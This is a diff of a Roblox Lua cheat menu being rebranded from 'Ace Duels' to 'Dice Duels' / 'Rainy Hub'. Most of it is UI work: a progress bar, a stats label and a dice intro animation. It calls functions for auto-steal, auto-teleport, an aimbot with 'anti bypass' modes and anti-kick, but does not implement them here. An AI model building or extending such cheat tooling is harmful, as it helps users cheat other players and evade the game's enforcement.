+progressRadLbl.Font = Enum.Font.GothamBold
+progressRadLbl.TextSize = 14
+progressRadLbl.TextXAlignment = Enum.TextXAlignment.Right
+progressRadLbl.ZIndex = 5
+local TRACK_WIDTH = 190
+local TRACK_KNOB_R = 11
 local fillRegion = Instance.new("Frame", pbFrame)
 fillRegion.Name = "Track"
-fillRegion.Size = UDim2.new(1, -24, 0, 22)
-fillRegion.Position = UDim2.new(0, 12, 0, 56)
-fillRegion.BackgroundColor3 = Color3.fromRGB(10, 20, 40)
+fillRegion.Size = UDim2.new(0, TRACK_WIDTH, 0, 18)
+fillRegion.Position = UDim2.new(0, 66, 0, 12)
+fillRegion.BackgroundColor3 = Color3.fromRGB(6, 6, 7)
 fillRegion.BorderSizePixel = 0
-fillRegion.ClipsDescendants = true
-fillRegion.ZIndex = 3
-Instance.new("UICorner", fillRegion).CornerRadius = UDim.new(0, 8)
+fillRegion.ZIndex = 2
+Instance.new("UICorner", fillRegion).CornerRadius = UDim.new(1, 0)
 local fillRegStroke = Instance.new("UIStroke", fillRegion)
-fillRegStroke.Color = BAR_EDGE
-fillRegStroke.Thickness = 1
-fillRegStroke.Transparency = 0.55
-
+fillRegStroke.Color = THEME_ACCENT_BRIGHT
+fillRegStroke.Thickness = 1.2
+fillRegStroke.Transparency = 0.35
 local progressFill = Instance.new("Frame", fillRegion)
 progressFill.Name = "Fill"
 progressFill.Size = UDim2.new(0, 0, 1, 0)
 progressFill.Position = UDim2.new(0, 0, 0, 0)
-progressFill.BackgroundColor3 = BAR_EDGE
+progressFill.BackgroundColor3 = THEME_ACCENT_BRIGHT
 progressFill.BorderSizePixel = 0
-progressFill.ZIndex = 4
-Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 8)
-local fillGradient = Instance.new("UIGradient", progressFill)
-fillGradient.Color = ColorSequence.new({
-ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 64, 150)),
-ColorSequenceKeypoint.new(0.45, Color3.fromRGB(56, 138, 255)),
-ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 186, 255)),
-})
-fillGradient.Rotation = 0
+progressFill.ZIndex = 3
+Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
+-- The knob rides the leading edge of the fill.
+local progressKnob = Instance.new("Frame", fillRegion)
+progressKnob.Name = "Knob"
+progressKnob.AnchorPoint = Vector2.new(0.5, 0.5)
+progressKnob.Size = UDim2.new(0, TRACK_KNOB_R * 2, 0, TRACK_KNOB_R * 2)
+progressKnob.Position = UDim2.new(0, TRACK_KNOB_R, 0.5, 0)
+progressKnob.BackgroundColor3 = Color3.fromRGB(238, 238, 242)
+progressKnob.BorderSizePixel = 0
+progressKnob.ZIndex = 6
+Instance.new("UICorner", progressKnob).CornerRadius = UDim.new(1, 0)
+local knobStroke = Instance.new("UIStroke", progressKnob)
+knobStroke.Color = Color3.fromRGB(255, 255, 255)
+knobStroke.Thickness = 1
+knobStroke.Transparency = 0.4
+local statLbl = Instance.new("TextLabel", pbFrame)
+statLbl.Name = "Stats"
+statLbl.Size = UDim2.new(1, -28, 0, 15)
+statLbl.Position = UDim2.new(0, 14, 0, 38)
+statLbl.BackgroundTransparency = 1
+statLbl.Text = "FPS: 0  discord.gg/rainyhub  PING: 0ms"
+statLbl.TextColor3 = Color3.fromRGB(232, 232, 238)
+statLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+statLbl.TextStrokeTransparency = 0.55
+statLbl.Font = Enum.Font.GothamSemibold
+-- Scaled rather than fixed: the discord handle and a three-digit FPS
+-- together are wider than the pill at a fixed size.
+statLbl.TextScaled = true
+statLbl.TextSize = 11
+statLbl.TextXAlignment = Enum.TextXAlignment.Center
+statLbl.ZIndex = 5
+do
+local limit = Instance.new("UITextSizeConstraint")
+limit.MaxTextSize = 11
+limit.MinTextSize = 7
+limit.Parent = statLbl
+end
 local barState = "IDLE"
 function setBarState(state)
 barState = state
 if state == "STEALING" then
-TS:Create(stealLbl, TweenInfo.new(0.2), {TextColor3 = BAR_GLOW}):Play()
-TS:Create(statusDot, TweenInfo.new(0.2), {BackgroundColor3 = BAR_GLOW}):Play()
+TS:Create(fillRegion, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(16, 16, 18)}):Play()
+TS:Create(progressPct, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
 elseif state == "READY" then
-TS:Create(stealLbl, TweenInfo.new(0.2), {TextColor3 = BAR_GLOW}):Play()
-TS:Create(statusDot, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(64, 214, 132)}):Play()
-progressPct.Text = "0%"
-progressPct.TextColor3 = BAR_GLOW
+TS:Create(fillRegion, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20, 20, 23)}):Play()
+TS:Create(progressPct, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
 else
-TS:Create(stealLbl, TweenInfo.new(0.2), {TextColor3 = BAR_DIM}):Play()
-TS:Create(statusDot, TweenInfo.new(0.2), {BackgroundColor3 = BAR_DIM}):Play()
-progressPct.Text = "0%"
-progressPct.TextColor3 = BAR_DIM
+TS:Create(fillRegion, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(6, 6, 7)}):Play()
+TS:Create(progressPct, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(168, 168, 174)}):Play()
 end
 end
 task.spawn(function()
@@ -7051,7 +7947,8 @@ pcall(function()
 local stat = Stats.Network.ServerStatsItem["Data Ping"]
 if stat then ping = tonumber(stat:GetValue()) or 0 end
 end)
-progressRadLbl.Text = string.format("FPS %d  /  %dms", math.floor(fpsAvg + 0.5), math.floor(ping + 0.5))
+statLbl.Text = string.format("FPS: %d  discord.gg/rainyhub  PING: %dms", math.floor(fpsAvg + 0.5), math.floor(ping + 0.5))
+progressRadLbl.Text = "Radius: " .. tostring(math.floor(tonumber(autoStealRadius) or 0))
 task.wait(0.5)
 end
 end)
@@ -7059,6 +7956,9 @@ local StealBar = {}
 function StealBar.SetProgress(p)
 p = math.clamp(p, 0, 1)
 progressFill.Size = UDim2.new(p, 0, 1, 0)
+-- Inset by the knob's radius so it never hangs off either end. The
+-- track's width is fixed, so this does not wait on layout to resolve.
+progressKnob.Position = UDim2.new(0, TRACK_KNOB_R + p * (TRACK_WIDTH - TRACK_KNOB_R * 2), 0.5, 0)
 progressPct.Text = math.floor(p * 100 + 0.5) .. "%"
 end
 function StealBar.Reset()
@@ -7071,13 +7971,13 @@ end
 setBarState("IDLE")
 _G.StealBar = StealBar
 end
-_G.__AceDuelsSetupStealBar()
-if _G.AceAutoStealSync then task.defer(_G.AceAutoStealSync) end
-_G.__AceDuelsSetupMinimizeToggle = function()
-_G.__AceDuelsMinimized = false
+_G.__DiceDuelsSetupStealBar()
+if _G.DiceAutoStealSync then task.defer(_G.DiceAutoStealSync) end
+_G.__DiceDuelsSetupMinimizeToggle = function()
+_G.__DiceDuelsMinimized = false
 Close.MouseButton1Click:Connect(function()
-_G.__AceDuelsMinimized = not _G.__AceDuelsMinimized
-if _G.__AceDuelsMinimized then
+_G.__DiceDuelsMinimized = not _G.__DiceDuelsMinimized
+if _G.__DiceDuelsMinimized then
 Main.Visible = false
 MiniFrame.Visible = true
 else
@@ -7085,16 +7985,16 @@ Main.Visible = true
 MiniFrame.Visible = false
 Main.Size = FULL_MAIN_SIZE
 end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
-_G.__AceDuelsSetupMinimizeToggle()
+_G.__DiceDuelsSetupMinimizeToggle()
 
-_G.__AceDuelsRunIntro = function()
+_G.__DiceDuelsRunIntro = function()
 local TS = TweenService
 local introGuiParent = Gui and Gui.Parent or PlayerGui
 local origSize = FULL_MAIN_SIZE or Main.Size
-local wasMinimizedBeforeIntro = (_G.__AceDuelsMinimized == true)
+local wasMinimizedBeforeIntro = (_G.__DiceDuelsMinimized == true)
 if not _introEnabled then
 stopIntroPlayback()
 stopIntroPreview()
@@ -7115,7 +8015,7 @@ MiniFrame.Visible = false
 Main.Size = UDim2.new(0, 0, 0, 0)
 task.spawn(function()
 local introGui = Instance.new("ScreenGui")
-introGui.Name = "AceDuelsIntro"
+introGui.Name = "RainyHubIntro"
 introGui.IgnoreGuiInset = true
 introGui.DisplayOrder = 100
 introGui.ResetOnSpawn = false
@@ -7143,12 +8043,12 @@ darkBg.ZIndex = 1
 local bgGrad = Instance.new("UIGradient", darkBg)
 bgGrad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(42,42,46)), ColorSequenceKeypoint.new(0.45, Color3.fromRGB(18,18,20)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,12))})
 bgGrad.Rotation = 90
-local redWash = Instance.new("Frame", introGui)
-redWash.Size = UDim2.new(1,0,1,0)
-redWash.BackgroundColor3 = Color3.fromRGB(255,255,255)
-redWash.BackgroundTransparency = 1
-redWash.BorderSizePixel = 0
-redWash.ZIndex = 2
+local flashWash = Instance.new("Frame", introGui)
+flashWash.Size = UDim2.new(1,0,1,0)
+flashWash.BackgroundColor3 = Color3.fromRGB(255,255,255)
+flashWash.BackgroundTransparency = 1
+flashWash.BorderSizePixel = 0
+flashWash.ZIndex = 2
 local skipBtn = Instance.new("TextButton", introGui)
 skipBtn.Name = "SkipIntro"
 skipBtn.AnchorPoint = Vector2.new(1,0)
@@ -7169,50 +8069,139 @@ skipStroke.Color = Color3.fromRGB(255,255,255)
 skipStroke.Thickness = 1
 skipStroke.Transparency = 0.12
 skipBtn.MouseButton1Click:Connect(finishIntro)
-function makeAceCard(parent, size, z)
-local card = Instance.new("Frame", parent)
-card.Size = UDim2.new(0, math.floor(size * 0.68), 0, size)
-card.AnchorPoint = Vector2.new(0.5, 0.5)
-card.BackgroundColor3 = Color3.fromRGB(238, 238, 232)
-card.BackgroundTransparency = 1
-card.BorderSizePixel = 0
-card.ZIndex = z or 6
-Instance.new("UICorner", card).CornerRadius = UDim.new(0, math.max(8, math.floor(size * 0.08)))
-local stroke = Instance.new("UIStroke", card)
-stroke.Color = Color3.fromRGB(190,190,190)
-stroke.Thickness = 1
+-- The intro tumbles dice rather than playing cards, built from the same
+-- stack as the panel motif. Returns the die plus the layers to fade,
+-- each paired with the transparency it settles at.
+function makeIntroDie(parent, size, z, face)
+local zi = z or 6
+local radius = math.max(5, math.floor(size * 0.2))
+local depth = math.max(2, math.floor(size * 0.085))
+local die = Instance.new("Frame", parent)
+die.Size = UDim2.new(0, size, 0, size)
+die.AnchorPoint = Vector2.new(0.5, 0.5)
+die.BackgroundTransparency = 1
+die.BorderSizePixel = 0
+die.ZIndex = zi
+local parts = {}
+local shade = Instance.new("Frame", die)
+shade.Name = "Shadow"
+shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shade.BackgroundTransparency = 1
+shade.BorderSizePixel = 0
+shade.Position = UDim2.new(0, depth + 2, 0, depth + 3)
+shade.Size = UDim2.new(1, 2, 1, 2)
+shade.ZIndex = zi
+Instance.new("UICorner", shade).CornerRadius = UDim.new(0, radius + 2)
+table.insert(parts, {obj = shade, t = 0.5})
+local block = Instance.new("Frame", die)
+block.Name = "Block"
+block.BackgroundColor3 = Color3.fromRGB(126, 126, 132)
+block.BackgroundTransparency = 1
+block.BorderSizePixel = 0
+block.Position = UDim2.new(0, depth, 0, depth)
+block.Size = UDim2.new(1, 0, 1, 0)
+block.ZIndex = zi + 1
+Instance.new("UICorner", block).CornerRadius = UDim.new(0, radius)
+local blockGrad = Instance.new("UIGradient", block)
+blockGrad.Color = ColorSequence.new(Color3.fromRGB(170,170,176), Color3.fromRGB(88,88,94))
+blockGrad.Rotation = 90
+table.insert(parts, {obj = block, t = 0.06})
+local faceFrame = Instance.new("Frame", die)
+faceFrame.Name = "Face"
+faceFrame.BackgroundColor3 = Color3.fromRGB(248, 248, 251)
+faceFrame.BackgroundTransparency = 1
+faceFrame.BorderSizePixel = 0
+faceFrame.Size = UDim2.new(1, 0, 1, 0)
+faceFrame.ZIndex = zi + 2
+Instance.new("UICorner", faceFrame).CornerRadius = UDim.new(0, radius)
+local grad = Instance.new("UIGradient", faceFrame)
+grad.Color = ColorSequence.new({
+ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
+ColorSequenceKeypoint.new(0.5, Color3.fromRGB(237,237,242)),
+ColorSequenceKeypoint.new(1, Color3.fromRGB(196,196,204)),
+})
+grad.Rotation = 118
+table.insert(parts, {obj = faceFrame, t = 0.02})
+local stroke = Instance.new("UIStroke", faceFrame)
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Color = Color3.fromRGB(255, 255, 255)
+stroke.Thickness = math.max(1, size * 0.05)
 stroke.Transparency = 1
-local grad = Instance.new("UIGradient", card)
-grad.Color = ColorSequence.new(Color3.fromRGB(255,255,255), Color3.fromRGB(195,198,200))
-grad.Rotation = 125
-local a1 = Instance.new("TextLabel", card)
-a1.Size = UDim2.new(0.28,0,0.25,0); a1.Position = UDim2.new(0.06,0,0.04,0)
-a1.BackgroundTransparency = 1; a1.Text = "A\n♠"; a1.TextColor3 = Color3.fromRGB(0,0,0)
-a1.Font = Enum.Font.GothamBlack; a1.TextScaled = true; a1.TextTransparency = 1; a1.ZIndex = (z or 6) + 1
-local suit = Instance.new("TextLabel", card)
-suit.Size = UDim2.new(0.62,0,0.52,0); suit.Position = UDim2.new(0.19,0,0.25,0)
-suit.BackgroundTransparency = 1; suit.Text = "♠"; suit.TextColor3 = Color3.fromRGB(0,0,0)
-suit.Font = Enum.Font.GothamBlack; suit.TextScaled = true; suit.TextTransparency = 1; suit.ZIndex = (z or 6) + 1
-local a2 = Instance.new("TextLabel", card)
-a2.Size = UDim2.new(0.28,0,0.25,0); a2.Position = UDim2.new(0.66,0,0.71,0)
-a2.BackgroundTransparency = 1; a2.Text = "A\n♠"; a2.TextColor3 = Color3.fromRGB(0,0,0)
-a2.Font = Enum.Font.GothamBlack; a2.TextScaled = true; a2.TextTransparency = 1; a2.Rotation = 180; a2.ZIndex = (z or 6) + 1
-return card, {a1, suit, a2}, stroke
+local rimGrad = Instance.new("UIGradient", stroke)
+rimGrad.Color = ColorSequence.new(Color3.fromRGB(255,255,255), Color3.fromRGB(112,112,120))
+rimGrad.Rotation = 118
+local sheen = Instance.new("Frame", faceFrame)
+sheen.Name = "Sheen"
+sheen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+sheen.BackgroundTransparency = 1
+sheen.BorderSizePixel = 0
+sheen.Position = UDim2.new(0, math.floor(size * 0.1), 0, math.floor(size * 0.08))
+sheen.Size = UDim2.new(1, -math.floor(size * 0.2), 0, math.max(2, math.floor(size * 0.34)))
+sheen.ZIndex = zi + 3
+Instance.new("UICorner", sheen).CornerRadius = UDim.new(0, math.max(2, math.floor(radius * 0.8)))
+local sheenGrad = Instance.new("UIGradient", sheen)
+sheenGrad.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 0),
+NumberSequenceKeypoint.new(1, 1),
+})
+sheenGrad.Rotation = 90
+table.insert(parts, {obj = sheen, t = 0.55})
+local spots = DIE_PIPS[math.clamp(math.floor(tonumber(face) or 1), 1, 6)]
+local pipSize = math.max(2, math.floor(size * 0.17))
+for _, spot in ipairs(spots) do
+local pip = Instance.new("Frame", faceFrame)
+pip.AnchorPoint = Vector2.new(0.5, 0.5)
+pip.Position = UDim2.new(spot[1], 0, spot[2], 0)
+pip.Size = UDim2.new(0, pipSize, 0, pipSize)
+pip.BackgroundColor3 = Color3.fromRGB(20, 20, 23)
+pip.BackgroundTransparency = 1
+pip.BorderSizePixel = 0
+pip.ZIndex = zi + 4
+Instance.new("UICorner", pip).CornerRadius = UDim.new(1, 0)
+local pipGrad = Instance.new("UIGradient", pip)
+pipGrad.Color = ColorSequence.new(Color3.fromRGB(4,4,6), Color3.fromRGB(84,84,92))
+pipGrad.Rotation = 118
+local lip = Instance.new("UIStroke", pip)
+lip.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+lip.Color = Color3.fromRGB(255, 255, 255)
+lip.Thickness = math.max(0.5, size * 0.018)
+lip.Transparency = 1
+local lipGrad = Instance.new("UIGradient", lip)
+lipGrad.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 1),
+NumberSequenceKeypoint.new(1, 0),
+})
+lipGrad.Rotation = 118
+table.insert(parts, {obj = pip, t = 0})
+end
+return die, parts, stroke
+end
+-- Each layer settles at its own transparency, so fading a die in is a
+-- walk over its parts rather than one tween on the frame.
+local function fadeDieIn(parts, time)
+for _, part in ipairs(parts) do
+TS:Create(part.obj, TweenInfo.new(time), {BackgroundTransparency = part.t}):Play()
+end
+end
+local function fadeDieOut(parts, time)
+for _, part in ipairs(parts) do
+TS:Create(part.obj, TweenInfo.new(time), {BackgroundTransparency = 1}):Play()
+end
 end
 local cards = {}
 for i = 1, 24 do
-local size = math.random(46, 108)
-local card, labels, stroke = makeAceCard(introGui, size, 5 + i)
+local size = math.random(34, 82)
+local card, dieParts, stroke = makeIntroDie(introGui, size, 5 + i, math.random(1, 6))
 local side = (i % 2 == 0) and -0.35 or 1.35
 local targetSide = (i % 2 == 0) and 1.35 or -0.35
 local y = math.random(4, 96) / 100
 card.Position = UDim2.new(side, 0, y, 0)
 card.Rotation = math.random(-40, 40)
-cards[i] = {frame=card, labels=labels, stroke=stroke, startX=side, endX=targetSide, y=y, speed=0.09+math.random()*0.10, bob=math.random()*6.28, rot=math.random(-55,55), drift=math.random(-14,14)/100}
+cards[i] = {frame=card, parts=dieParts, stroke=stroke, startX=side, endX=targetSide, y=y, speed=0.09+math.random()*0.10, bob=math.random()*6.28, rot=math.random(-55,55), drift=math.random(-14,14)/100}
 end
-local aceLogo, aceLabels, aceStroke = makeAceCard(introGui, 170, 25)
-aceLogo.Position = UDim2.new(0.5,0,-0.35,0)
-aceLogo.Rotation = -12
+local introDie, introDiePips, introDieStroke = makeIntroDie(introGui, 130, 25, 5)
+introDie.Position = UDim2.new(0.5,0,-0.35,0)
+introDie.Rotation = -12
 local t = 0
 local driftConn = RunService.Heartbeat:Connect(function(dt)
 if not introActive then return end
@@ -7238,11 +8227,11 @@ lineBot.AnchorPoint = Vector2.new(0.5,1); lineBot.Position = UDim2.new(0.5,0,1,-
 lineBot.BackgroundColor3 = Color3.fromRGB(225,225,225); lineBot.BorderSizePixel = 0; lineBot.ZIndex = 41
 local titleShadow = Instance.new("TextLabel", center)
 titleShadow.Size = UDim2.new(1,0,0,86); titleShadow.Position = UDim2.new(0,4,0,83); titleShadow.BackgroundTransparency = 1
-titleShadow.Text = "RAINY HUB"; titleShadow.TextColor3 = Color3.fromRGB(0,0,0); titleShadow.Font = Enum.Font.GothamBlack; titleShadow.TextSize = 72
+titleShadow.Text = "DICE DUELS"; titleShadow.TextColor3 = Color3.fromRGB(0,0,0); titleShadow.Font = Enum.Font.GothamBlack; titleShadow.TextSize = 72
 titleShadow.TextTransparency = 1; titleShadow.TextStrokeTransparency = 1; titleShadow.ZIndex = 42
 local title = Instance.new("TextLabel", center)
 title.Size = UDim2.new(1,0,0,86); title.Position = UDim2.new(0,0,0,78); title.BackgroundTransparency = 1
-title.Text = "RAINY HUB"; title.TextColor3 = Color3.fromRGB(245,245,245); title.Font = Enum.Font.GothamBlack; title.TextSize = 72
+title.Text = "DICE DUELS"; title.TextColor3 = Color3.fromRGB(245,245,245); title.Font = Enum.Font.GothamBlack; title.TextSize = 72
 title.TextTransparency = 1; title.TextStrokeTransparency = 1; title.TextStrokeColor3 = Color3.fromRGB(35,35,35); title.ZIndex = 43
 local subtitle = Instance.new("TextLabel", center)
 subtitle.Size = UDim2.new(1,0,0,26); subtitle.Position = UDim2.new(0,0,0,169); subtitle.BackgroundTransparency = 1
@@ -7251,15 +8240,14 @@ TS:Create(darkBg, TweenInfo.new(0.65), {BackgroundTransparency = 0.22}):Play()
 for _, cd in ipairs(cards) do
 task.delay(math.random() * 0.9, function()
 if not introActive then return end
-TS:Create(cd.frame, TweenInfo.new(0.65), {BackgroundTransparency = 0.08}):Play()
+fadeDieIn(cd.parts, 0.65)
 if cd.stroke then TS:Create(cd.stroke, TweenInfo.new(0.65), {Transparency = 0.25}):Play() end
-for _, lbl in ipairs(cd.labels) do TS:Create(lbl, TweenInfo.new(0.65), {TextTransparency = 0}):Play() end
 end)
 end
 task.wait(0.85); if not introActive then pcall(function() driftConn:Disconnect() end); return end
-TS:Create(aceLogo, TweenInfo.new(1.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5,0,0.20,0), BackgroundTransparency = 0.02, Rotation = 8}):Play()
-if aceStroke then TS:Create(aceStroke, TweenInfo.new(0.55), {Transparency = 0.15}):Play() end
-for _, lbl in ipairs(aceLabels) do TS:Create(lbl, TweenInfo.new(0.55), {TextTransparency = 0}):Play() end
+TS:Create(introDie, TweenInfo.new(1.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5,0,0.20,0), Rotation = 8}):Play()
+if introDieStroke then TS:Create(introDieStroke, TweenInfo.new(0.55), {Transparency = 0.15}):Play() end
+fadeDieIn(introDiePips, 0.55)
 task.wait(1.05); if not introActive then pcall(function() driftConn:Disconnect() end); return end
 TS:Create(lineTop, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,500,0,2)}):Play()
 TS:Create(lineBot, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,500,0,2)}):Play()
@@ -7281,14 +8269,13 @@ TS:Create(titleShadow, TweenInfo.new(0.36), {TextTransparency = 1}):Play()
 TS:Create(subtitle, TweenInfo.new(0.32), {TextTransparency = 1}):Play()
 TS:Create(lineTop, TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,2)}):Play()
 TS:Create(lineBot, TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,2)}):Play()
-TS:Create(aceLogo, TweenInfo.new(0.55, Enum.EasingStyle.Quad), {Position = UDim2.new(0.5,0,1.25,0), BackgroundTransparency = 1, Rotation = 28}):Play()
-for _, lbl in ipairs(aceLabels) do TS:Create(lbl, TweenInfo.new(0.45), {TextTransparency = 1}):Play() end
-if aceStroke then TS:Create(aceStroke, TweenInfo.new(0.45), {Transparency = 1}):Play() end
+TS:Create(introDie, TweenInfo.new(0.55, Enum.EasingStyle.Quad), {Position = UDim2.new(0.5,0,1.25,0), Rotation = 28}):Play()
+fadeDieOut(introDiePips, 0.45)
+if introDieStroke then TS:Create(introDieStroke, TweenInfo.new(0.45), {Transparency = 1}):Play() end
 TS:Create(darkBg, TweenInfo.new(0.75), {BackgroundTransparency = 1}):Play()
 for _, cd in ipairs(cards) do
-TS:Create(cd.frame, TweenInfo.new(0.55), {BackgroundTransparency = 1}):Play()
+fadeDieOut(cd.parts, 0.55)
 if cd.stroke then TS:Create(cd.stroke, TweenInfo.new(0.55), {Transparency = 1}):Play() end
-for _, lbl in ipairs(cd.labels) do TS:Create(lbl, TweenInfo.new(0.55), {TextTransparency = 1}):Play() end
 end
 Main.Visible = true
 MiniFrame.Visible = false
@@ -7299,9 +8286,9 @@ pcall(function() driftConn:Disconnect() end)
 pcall(function() introGui:Destroy() end)
 end)
 end
-_G.__AceDuelsRunIntro()
+_G.__DiceDuelsRunIntro()
 
-_G.AceDuelsForceSyncLoadedButtons = function()
+_G.DiceDuelsForceSyncLoadedButtons = function()
 pcall(function()
 if setAutoTPVisual then setAutoTPVisual(autoTPEnabled) end
 if autoTPEnabled then startAutoTP() else stopAutoTP() end
@@ -7315,64 +8302,64 @@ if setAntiRagdollVisual then setAntiRagdollVisual(antiRagdollEnabled) end
 setAntiRagdoll(antiRagdollEnabled)
 end)
 pcall(function()
-if _G.AceSetAutoLeft then _G.AceSetAutoLeft(autoLeftEnabled, true) end
-if _G.AceSetAutoRight then _G.AceSetAutoRight(autoRightEnabled, true) end
+if _G.DiceSetAutoLeft then _G.DiceSetAutoLeft(autoLeftEnabled, true) end
+if _G.DiceSetAutoRight then _G.DiceSetAutoRight(autoRightEnabled, true) end
 end)
 pcall(function()
 if setAutoStealVisual then setAutoStealVisual(autoStealEnabled) end
-if _G.AceAutoStealSync then _G.AceAutoStealSync() end
+if _G.DiceAutoStealSync then _G.DiceAutoStealSync() end
 end)
 pcall(function()
-if _G.AceNormalAutoSwingSetVisual then _G.AceNormalAutoSwingSetVisual(autoSwingEnabled) end
-if _G.AceMirrorTPDownSetVisual then _G.AceMirrorTPDownSetVisual(mirrorTPDownEnabled) end
-if _G.AceAntiDesyncAutoSwingSetVisual then _G.AceAntiDesyncAutoSwingSetVisual(antiDesyncAutoSwingEnabled) end
-if _G.AceAntiDesyncSetVisual then _G.AceAntiDesyncSetVisual(_G.AceAntiDesyncAimbotOn == true) end
-if _G.AceAntiDesyncAimbotOn and _G.AceStartAntiDesyncAimbot then
-_G.AceStartAntiDesyncAimbot()
-elseif _G.AceStopAntiDesyncAimbot then
-_G.AceStopAntiDesyncAimbot()
+if _G.DiceNormalAutoSwingSetVisual then _G.DiceNormalAutoSwingSetVisual(autoSwingEnabled) end
+if _G.DiceMirrorTPDownSetVisual then _G.DiceMirrorTPDownSetVisual(mirrorTPDownEnabled) end
+if _G.DiceAntiDesyncAutoSwingSetVisual then _G.DiceAntiDesyncAutoSwingSetVisual(antiDesyncAutoSwingEnabled) end
+if _G.DiceAntiDesyncSetVisual then _G.DiceAntiDesyncSetVisual(_G.DiceAntiDesyncAimbotOn == true) end
+if _G.DiceAntiDesyncAimbotOn and _G.DiceStartAntiDesyncAimbot then
+_G.DiceStartAntiDesyncAimbot()
+elseif _G.DiceStopAntiDesyncAimbot then
+_G.DiceStopAntiDesyncAimbot()
 end
 end)
 pcall(function()
 if selectedAimbotMode == "Anti Bypass" then
-if _G.AceNormalAimbotStop then _G.AceNormalAimbotStop() end
-if _G.AceAntiBypassAimbotOn and _G.AceAntiBypassStart then
-_G.AceAntiBypassStart()
-elseif _G.AceAntiBypassStop then
-_G.AceAntiBypassStop()
+if _G.DiceNormalAimbotStop then _G.DiceNormalAimbotStop() end
+if _G.DiceAntiBypassAimbotOn and _G.DiceAntiBypassStart then
+_G.DiceAntiBypassStart()
+elseif _G.DiceAntiBypassStop then
+_G.DiceAntiBypassStop()
 end
 else
-if _G.AceAntiBypassStop then _G.AceAntiBypassStop() end
-if _G.AceNormalAimbotOn and _G.AceNormalAimbotStart then
-_G.AceNormalAimbotStart()
-elseif _G.AceNormalAimbotStop then
-_G.AceNormalAimbotStop()
+if _G.DiceAntiBypassStop then _G.DiceAntiBypassStop() end
+if _G.DiceNormalAimbotOn and _G.DiceNormalAimbotStart then
+_G.DiceNormalAimbotStart()
+elseif _G.DiceNormalAimbotStop then
+_G.DiceNormalAimbotStop()
 end
 end
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 end)
 pcall(function()
 if setBatCounterVisual then setBatCounterVisual(batCounterEnabled) end
 if setMedCounterVisual then setMedCounterVisual(medCounterEnabled) end
 if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
 if batCounterEnabled then
-if _G.AceStartBatCounter then _G.AceStartBatCounter() end
+if _G.DiceStartBatCounter then _G.DiceStartBatCounter() end
 else
-if _G.AceStopBatCounter then _G.AceStopBatCounter() end
+if _G.DiceStopBatCounter then _G.DiceStopBatCounter() end
 end
 if medCounterEnabled then
-if _G.AceStartMedCounter then _G.AceStartMedCounter(LP.Character) end
+if _G.DiceStartMedCounter then _G.DiceStartMedCounter(LP.Character) end
 else
-if _G.AceStopMedCounter then _G.AceStopMedCounter() end
+if _G.DiceStopMedCounter then _G.DiceStopMedCounter() end
 end
-if _G.AceSetNoPlayerCollisionVisual then _G.AceSetNoPlayerCollisionVisual(_G.AceNoPlayerCollisionEnabled) end
-if _G.AceNoPlayerCollisionEnabled then
+if _G.DiceSetNoPlayerCollisionVisual then _G.DiceSetNoPlayerCollisionVisual(_G.DiceNoPlayerCollisionEnabled) end
+if _G.DiceNoPlayerCollisionEnabled then
 if enableNoPlayerCollision then enableNoPlayerCollision() end
 else
 if disableNoPlayerCollision then disableNoPlayerCollision() end
 end
-if _G.AceSetAutoResetOnMed then
-_G.AceSetAutoResetOnMed(autoResetOnMedEnabled, true)
+if _G.DiceSetAutoResetOnMed then
+_G.DiceSetAutoResetOnMed(autoResetOnMedEnabled, true)
 else
 if setAutoResetOnMedVisual then setAutoResetOnMedVisual(autoResetOnMedEnabled) end
 end
@@ -7400,7 +8387,7 @@ applyCustomSky((skyTheme and skyTheme ~= "") and skyTheme or "Off")
 end
 if skyValueLabel then skyValueLabel.Text = skyTheme or "Off" end
 end)
-pcall(saveAceConfig)
+pcall(saveDiceConfig)
 end
 task.defer(function()
 task.wait(0.35)
@@ -7409,19 +8396,19 @@ pcall(function() applyCustomSky((skyTheme and skyTheme ~= "") and skyTheme or "O
 end
 if skyValueLabel then skyValueLabel.Text = skyTheme or "Off" end
 end)
-task.defer(_G.AceDuelsForceSyncLoadedButtons)
+task.defer(_G.DiceDuelsForceSyncLoadedButtons)
 task.delay(1, function()
-if _G.AceDuelsForceSyncLoadedButtons then _G.AceDuelsForceSyncLoadedButtons() end
+if _G.DiceDuelsForceSyncLoadedButtons then _G.DiceDuelsForceSyncLoadedButtons() end
 end)
 task.defer(function()
 task.wait(0.2)
-if _G.AceSyncToggleVisuals then _G.AceSyncToggleVisuals() end
